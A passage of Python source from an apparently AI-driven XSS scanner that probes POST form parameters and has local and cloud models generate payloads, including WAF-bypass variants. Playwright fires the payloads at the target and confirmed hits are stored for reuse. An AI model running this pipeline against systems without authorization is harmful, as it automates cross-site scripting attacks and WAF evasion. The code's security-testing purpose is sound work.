        put_result(WorkerResult(url=post_form.action_url, status="no_params", waf=waf_hint))
        return

    # Probe all params for reflection
    probe_results = probe_post_form(
        action_url=post_form.action_url,
        source_page_url=post_form.source_page_url,
        param_names=post_form.param_names,
        csrf_field=post_form.csrf_field,
        hidden_defaults=post_form.hidden_defaults,
        rate=rate,
        waf=waf_hint,
        auth_headers=auth_headers,
        crawled_pages=crawled_pages,
        sink_url=sink_url,
    )

    injectable = [r for r in probe_results if r.is_injectable]
    reflected = [r for r in probe_results if r.is_reflected]

    _cached_context: Any = None
    try:
        _cached_context = _parse_target(
            url=post_form.source_page_url,
            html_value=None,
            waf=waf_hint,
            auth_headers=auth_headers,
        )
        if waf_source:
            from ai_xss_generator.waf_knowledge import analyze_waf_source, attach_waf_knowledge
            _cached_context = attach_waf_knowledge(_cached_context, analyze_waf_source(waf_source))
    except Exception as exc:
        log.debug("Pre-parse of form source %s failed: %s", post_form.source_page_url, exc)

    generation_context = _cached_context
    effective_sink_url = sink_url

    # Start Playwright executor
    executor = ActiveExecutor(auth_headers=auth_headers)
    try:
        executor.start()
    except Exception as exc:
        put_result(WorkerResult(
            url=post_form.action_url, status="error",
            error=f"Playwright start failed: {exc}", waf=waf_hint,
        ))
        return

    post_session_lessons: list[Any] = []
    target_disposition: Any = None
    try:
        if not _timed_out():
            discovered_sink_url, sink_reflection, parsed_sink_context = _autodiscover_post_sink_context(
                executor=executor,
                post_form=post_form,
                manual_sink_url=sink_url,
                crawled_pages=crawled_pages,
                auth_headers=auth_headers,
                waf_hint=waf_hint,
            )
            if discovered_sink_url:
                effective_sink_url = sink_url or discovered_sink_url
            if sink_reflection is not None:
                probe_results = _override_probe_results_with_sink_reflection(
                    probe_results,
                    post_form.param_names,
                    sink_reflection,
                )
                reflected = [result for result in probe_results if result.is_reflected]
                injectable = [result for result in probe_results if result.is_injectable]
            if parsed_sink_context is not None:
                if waf_source:
                    from ai_xss_generator.waf_knowledge import analyze_waf_source, attach_waf_knowledge
                    parsed_sink_context = attach_waf_knowledge(parsed_sink_context, analyze_waf_source(waf_source))
                generation_context = parsed_sink_context

        from ai_xss_generator.behavior import (
            attach_behavior_profile,
            build_target_behavior_profile,
            classify_target_disposition,
        )
        from ai_xss_generator.learning import build_memory_profile
        from ai_xss_generator.lessons import (
            build_behavior_lessons,
            build_mapping_lessons,
            build_probe_lessons,
        )

        behavior_profile = build_target_behavior_profile(
            url=post_form.action_url,
            delivery_mode="post",
            waf_name=waf_hint,
            auth_required=bool(auth_headers),
            context=generation_context,
            probe_results=probe_results,
        )
        generation_context = attach_behavior_profile(generation_context, behavior_profile)
        target_disposition = classify_target_disposition(
            generation_context,
            delivery_mode="post",
            reflected_params=len(reflected),
            injectable_params=len(injectable),
        )

        memory_profile = build_memory_profile(
            context=generation_context,
            waf_name=waf_hint,
            delivery_mode="post",
            target_host=urllib.parse.urlparse(post_form.action_url).netloc,
        )
        if auth_headers:
            memory_profile["auth_required"] = True
        post_session_lessons.extend(build_behavior_lessons(behavior_profile))
        if generation_context is not None:
            post_session_lessons.extend(build_mapping_lessons(
                generation_context,
                memory_profile=memory_profile,
            ))
        if reflected:
            post_session_lessons.extend(build_probe_lessons(
                reflected,
                memory_profile=memory_profile,
                delivery_mode="post",
            ))
    except Exception as exc:
        log.debug("POST lesson build failed for %s: %s", post_form.action_url, exc)

    if not reflected:
        try:
            put_result(WorkerResult(
                url=post_form.action_url,
                status="no_reflection",
                waf=waf_hint,
                params_tested=len(post_form.param_names),
                dead_target=True,
                dead_reason=(
                    getattr(target_disposition, "reason", "")
                    or "No reflection was confirmed during bounded discovery."
                ),
                target_tier=getattr(target_disposition, "tier", "hard_dead"),
            ))
        finally:
            executor.stop()
        return

    if not injectable:
        try:
            put_result(WorkerResult(
                url=post_form.action_url,
                status="no_reflection",
                waf=waf_hint,
                params_tested=len(post_form.param_names),
                params_reflected=len(reflected),
                dead_target=True,
                dead_reason=(
                    getattr(target_disposition, "reason", "")
                    or "Reflection exists, but no executable context was confirmed."
                ),
                target_tier=getattr(target_disposition, "tier", "soft_dead"),
            ))
        finally:
            executor.stop()
        return

    confirmed_findings: list[ConfirmedFinding] = []
    total_transforms_tried = 0
    cloud_escalated = False
    local_model_rounds = 0
    cloud_model_rounds = 0
    fallback_rounds = 0
    escalation_reasons: list[str] = []

    try:
        for probe_result in injectable:
            if _timed_out():
                break

            param_name = probe_result.param_name
            param_variants = all_variants_for_probe(probe_result)

            for _pname, context_type, variants in param_variants:
                if _timed_out():
                    break

                context_probe_result = _probe_result_for_context(probe_result, context_type)
                from ai_xss_generator.behavior import derive_ai_escalation_policy

                escalation_policy = derive_ai_escalation_policy(
                    generation_context,
                    delivery_mode="post",
                    context_type=context_type,
                )
                _append_reason(escalation_reasons, escalation_policy.note)
                cloud_plan = CloudPayloadPlan()
                context_done = False
                context_variant_keys: set[str] = set()
                _ai_tried_payloads: list[tuple[str, str]] = []  # (payload, source)

                def _record_context_finding(finding: ConfirmedFinding) -> bool:
                    key = _finding_variant_key(finding)
                    if key in context_variant_keys:
                        return False
                    context_variant_keys.add(key)
                    confirmed_findings.append(finding)
                    # Tier-2 promotion: confirmed execution → highest-signal seed
                    try:
                        from ai_xss_generator.seed_pool import SeedPool
                        from ai_xss_generator.findings import infer_bypass_family as _ibf
                        SeedPool().add_confirmed(
                            finding.payload,
                            finding.context_type,
                            waf=finding.waf or "",
                            bypass_family=finding.bypass_family or _ibf(finding.payload, []),
                            surviving_chars=finding.surviving_chars,
                            source=finding.source,
                        )
                    except Exception:
                        pass
                    return True

                # Local model triage gate for POST params — mirrors GET behaviour.
                _triage_approved = True
                if escalation_policy.use_local and not context_done and not _timed_out():
                    local_model_rounds += 1
                    _triage = _triage_with_local_model(
                        probe_result=context_probe_result,
                        model=model,
                        waf=waf_hint,
                        delivery_mode="post",
                        fast_mode=fast,
                    )
                    _triage_approved = _triage.should_escalate
                    _append_reason(escalation_reasons, f"[triage score={_triage.score}] {_triage.reason}")
                    if _triage.context_notes:
                        _append_reason(escalation_reasons, _triage.context_notes)
                    if not _triage_approved:
                        log.debug(
                            "Triage gate: skipping cloud for POST %s param=%s (score=%d): %s",
                            post_form.action_url, param_name, _triage.score, _triage.reason,
                        )

                if not context_done and _triage_approved and use_cloud and not _timed_out():
                    surviving_chars = frozenset().union(
                        *(ctx.surviving_chars for ctx in context_probe_result.reflections)
                    )
                    attempt_limit = max(1, cloud_attempts)
                    ekey = _escalation_key(
                        url=post_form.action_url,
                        param_name=param_name,
                        waf=waf_hint,
                        surviving_chars=surviving_chars,
                        context_type=context_type,
                    )
                    cloud_feedback_lessons: list[Any] | None = None
                    seen_cloud_payloads: set[str] = set()
                    fast_generated_count = 0
                    fast_reflected_count = 0

                    for attempt_number in range(1, attempt_limit + 1):
                        if _timed_out():
                            break

                        cloud_escalated = True
                        cloud_model_rounds += 1
                        cloud_plan = _coerce_cloud_plan(_get_cloud_payloads(
                            url=post_form.source_page_url,
                            probe_result=context_probe_result,
                            cloud_model=cloud_model,
                            waf=waf_hint,
                            ekey=ekey,
                            dedup_registry=dedup_registry,
                            dedup_lock=dedup_lock,
                            base_context=generation_context,
                            auth_headers=auth_headers,
                            ai_backend=ai_backend,
                            cli_tool=cli_tool,
                            cli_model=cli_model,
                            delivery_mode="post",
                            session_lessons=post_session_lessons,
                            feedback_lessons=cloud_feedback_lessons,
                            phase_profile=phase_profile,
                            deep=deep,
                        ))
                        cloud_payloads, duplicate_payloads = _unique_new_payloads(
                            cloud_plan.payloads,
                            seen_cloud_payloads,
                        )
                        fast_generated_count += len(cloud_payloads)

                        failed_results: list[Any] = []
                        for cp in cloud_payloads:
                            if _timed_out():
                                break
                            total_transforms_tried += 1
                            result = executor.fire_post(
                                source_page_url=post_form.source_page_url,
                                action_url=post_form.action_url,
                                param_name=param_name,
                                payload=_payload_text(cp),
                                all_param_names=post_form.param_names,
                                csrf_field=post_form.csrf_field,
                                transform_name="cloud_model",
                                sink_url=effective_sink_url,
                                payload_candidate=cp,
                                extra_sink_urls=crawled_pages or [],
                            )
                            if result.confirmed:
                                finding = _make_finding(
                                    url=post_form.action_url,
                                    probe_result=context_probe_result,
                                    context_type=context_type,
                                    result=result,
                                    waf=waf_hint,
                                    source="cloud_model",
                                    cloud_escalated=True,
                                    ai_engine=cloud_plan.engine,
                                    ai_note=_merge_ai_notes(
                                        escalation_policy.note,
                                        _cloud_attempt_note(
                                            cloud_plan.note,
                                            attempt_number,
                                            attempt_limit,
                                        ),
                                    ),
                                )
                                if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                    context_done = True
                                    break
                            failed_results.append(result)

                        cloud_feedback_lessons = _build_cloud_feedback_lessons(
                            attempt_number=attempt_number,
                            total_attempts=attempt_limit,
                            prompt_context=generation_context,
                            delivery_mode="post",
                            context_type=context_type,
                            sink_context=context_type,
                            payloads_tried=cloud_payloads,
                            execution_results=failed_results,
                            duplicate_payloads=duplicate_payloads,
                            observation=_summarize_failed_execution_results(failed_results),
                        )
                        fast_reflected_count += _reflected_payload_count(failed_results, len(cloud_payloads))
                        if context_done or attempt_number >= attempt_limit:
                            break

                    if not context_done and not deep and not _timed_out() and fast_generated_count > 0:
                        _esc = _build_deep_escalation_plan(
                            url=post_form.source_page_url,
                            probe_result=context_probe_result,
                            delivery_mode="post",
                            context=generation_context,
                            cloud_model=cloud_model,
                            waf_hint=waf_hint,
                            ekey=ekey,
                            dedup_registry=dedup_registry,
                            dedup_lock=dedup_lock,
                            auth_headers=auth_headers,
                            ai_backend=ai_backend,
                            cli_tool=cli_tool,
                            cli_model=cli_model,
                            session_lessons=post_session_lessons,
                            feedback_lessons=cloud_feedback_lessons,
                            phase_profile=phase_profile,
                            fast_generated_count=fast_generated_count,
                            fast_reflected_count=fast_reflected_count,
                        )
                        cloud_model_rounds += _esc.cloud_model_rounds_used
                        cloud_plan = _esc.cloud_plan
                        cloud_payloads, _ = _unique_new_payloads(
                            cloud_plan.payloads,
                            seen_cloud_payloads,
                        )
                        for cp in cloud_payloads:
                            if _timed_out():
                                break
                            total_transforms_tried += 1
                            result = executor.fire_post(
                                source_page_url=post_form.source_page_url,
                                action_url=post_form.action_url,
                                param_name=param_name,
                                payload=_payload_text(cp),
                                all_param_names=post_form.param_names,
                                csrf_field=post_form.csrf_field,
                                transform_name="cloud_model",
                                sink_url=effective_sink_url,
                                payload_candidate=cp,
                                extra_sink_urls=crawled_pages or [],
                            )
                            if result.confirmed:
                                finding = _make_finding(
                                    url=post_form.action_url,
                                    probe_result=context_probe_result,
                                    context_type=context_type,
                                    result=result,
                                    waf=waf_hint,
                                    source="cloud_model",
                                    cloud_escalated=True,
                                    ai_engine=cloud_plan.engine,
                                    ai_note=_merge_ai_notes(
                                        escalation_policy.note,
                                        "Deep escalation after scout attempts exhausted.",
                                        cloud_plan.note,
                                    ),
                                )
                                if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                    context_done = True
                                    break

                if not context_done and waf_hint and not _timed_out():
                    waf_payloads = _waf_reference_payloads(waf_hint, context_probe_result, limit=4)
                    if waf_payloads:
                        fallback_rounds += 1
                        _append_reason(
                            escalation_reasons,
                            f"Inserted bounded {waf_hint} WAF-specific fallback candidates before generic transforms.",
                        )
                    for wp in waf_payloads:
                        if _timed_out():
                            break
                        total_transforms_tried += 1
                        result = executor.fire_post(
                            source_page_url=post_form.source_page_url,
                            action_url=post_form.action_url,
                            param_name=param_name,
                            payload=_payload_text(wp),
                            all_param_names=post_form.param_names,
                            csrf_field=post_form.csrf_field,
                            transform_name="waf_payload",
                            sink_url=effective_sink_url,
                            payload_candidate=wp,
                            extra_sink_urls=crawled_pages or [],
                        )
                        if result.confirmed:
                            finding = _make_finding(
                                url=post_form.action_url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_waf_fallback",
                                cloud_escalated=cloud_escalated,
                                ai_note=f"Bounded {waf_hint} WAF-specific fallback candidate confirmed execution.",
                            )
                            if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                context_done = True
                                break

                if not context_done and not _timed_out():
                    fallback_rounds += 1
                    for variant in variants:
                        if _timed_out():
                            break

                        total_transforms_tried += 1
                        result = executor.fire_post(
                            source_page_url=post_form.source_page_url,
                            action_url=post_form.action_url,
                            param_name=param_name,
                            payload=variant.payload,
                            all_param_names=post_form.param_names,
                            csrf_field=post_form.csrf_field,
                            transform_name=variant.transform_name,
                            sink_url=effective_sink_url,
                            extra_sink_urls=crawled_pages or [],
                        )

                        if result.confirmed:
                            finding = _make_finding(
                                url=post_form.action_url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_transform",
                                cloud_escalated=False,
                                ai_note=_merge_ai_notes(
                                    escalation_policy.note,
                                    cloud_plan.note if use_cloud else "",
                                ),
                            )
                            if _record_context_finding(finding) and len(context_variant_keys) >= context_hit_cap:
                                context_done = True
                                break

    finally:
        executor.stop()

    status = "confirmed" if confirmed_findings else "no_execution"
    put_result(WorkerResult(
        url=post_form.action_url,
        status=status,
        confirmed_findings=confirmed_findings,
        transforms_tried=total_transforms_tried,
        cloud_escalated=cloud_escalated,
        waf=waf_hint,
        params_tested=len(post_form.param_names),
        params_reflected=len(reflected),
        kind="post",
        target_tier=getattr(target_disposition, "tier", "live"),
        local_model_rounds=local_model_rounds,
        cloud_model_rounds=cloud_model_rounds,
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))
